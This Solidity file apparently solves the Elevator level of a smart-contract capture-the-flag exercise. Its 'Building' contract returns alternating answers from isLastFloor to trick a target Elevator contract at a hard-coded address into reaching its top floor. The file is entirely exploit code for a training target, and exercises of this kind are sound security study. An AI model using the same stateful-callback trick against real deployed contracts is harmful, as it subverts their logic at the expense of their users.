// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "src/elevator/Elevator.sol";

contract Building {
    Elevator private elevator =
        Elevator(0x17c059f135ad4222A8BD3d9917C8AAf4c3c94E26);
    bool lastFloor = false;

    function isLastFloor(uint) external returns (bool) {
        lastFloor = !lastFloor;
        return !lastFloor;
    }

    function goTo(uint _floor) public {
        elevator.goTo(_floor);
    }
}
